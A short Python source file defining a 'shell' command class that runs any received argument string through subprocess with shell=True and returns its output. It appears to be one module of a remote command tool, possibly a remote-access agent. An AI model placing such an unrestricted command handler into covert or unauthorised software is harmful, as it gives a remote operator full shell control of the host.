from .base_command import BaseCommand
import subprocess
import platform


class ShellCommand(BaseCommand):
    name = "shell"

    def execute(self, args: str, client=None) -> str:
        if not args:
            return ""

        try:
            if platform.system() == "Windows":
                result = subprocess.run(
                    args,
                    shell=True,
                    capture_output=True,
                    text=True
                )
            else:
                result = subprocess.run(
                    args,
                    shell=True,
                    executable="/bin/bash",
                    capture_output=True,
                    text=True
                )

            return result.stdout + result.stderr

        except Exception as e:
            return f"[!] Error: {e}"